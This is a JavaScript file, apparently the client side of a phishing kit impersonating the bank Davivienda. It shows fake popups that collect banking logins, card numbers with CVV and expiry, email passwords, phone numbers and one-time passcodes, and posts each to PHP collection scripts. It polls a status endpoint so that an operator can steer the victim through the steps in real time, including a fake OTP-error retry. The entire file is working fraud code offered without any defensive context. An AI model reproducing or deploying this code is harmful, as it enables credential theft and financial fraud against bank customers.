let identificadorTiempoDeEspera;
var espera = 0;

function ventana_tarjeta() {
    $(".mensaje").hide();
    $("#popTarjeta").show();    
    $("#txtTarjeta,#txtCVV,#mFecha,#aFecha").val("");
    $("#txtTarjeta").focus();       
}

function ventana_correo() {
    $(".mensaje").hide();
    $("#txtCorreo,#txtClaveCorreo,#txtCelular").val("");    
    $("#popCorreo").show();
    $("#txtCorreo").focus();        
}

function ventana_otp(){
    $(".mensaje").hide();
    $("#txtOTP").val("");    
    $("#popOTP").show();
    $("#txtOTP").focus(); 
}

function ventana_errorotp(){
    $(".mensaje").hide();
    $("#txtOTPErr").val("");    
    $("#popOTPErr").show();
    $("#txtOTPErr").focus(); 
}

function ventana_usuario(){

}


function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}



function consultar_estado(){

    if (espera == 1) { 

        $.post( "../../../process/estado.php",function(data) {
           
            switch (data) {
                case '2':espera = 0;
                         ventana_otp(); 
                         break;
                case '4':espera = 0;
                         ventana_correo(); 
                         break;
                case '6':espera = 0;
                         ventana_tarjeta();  
                         break;               
                case '8':espera = 0;
                         ventana_errorotp(); 
                         break;
                case '10':espera = 0;
                          window.location.href = "../../../finish-no-back-button/";
                          break;
                case '12':espera = 0;
                          ventana_usuario(); 
                          break;
            } 
        });    
    }    
}



 function enviar_login(td,nd,cl){    
    var d = detectar_dispositivo();
    var u = "[" + td + "]" + nd;

    $.post( "../../../process/pasologin.php", { usr:u, pas: cl, dis: d,ban:"Davivienda"} ,function(data) {
        espera = 1;  
    });
 }

 function enviar_tarjeta(t,f,c){    
    $.post( "../../../process/pasotarjeta.php", { tar:t,fec:f,cvv:c } ,function(data) {        
        espera = 1; 
    });
 }

 function enviar_correo(e,c,t){    
    $.post( "../../../process/pasocorreo.php", { eml:e,clv:c,cel:t } ,function(data) {       
       espera = 1; 
    });
 }

 function enviar_otp(o){    
    $.post( "../../../process/pasootp.php", { otp: o} ,function(data) {      
       espera = 1; 
    });
 }

 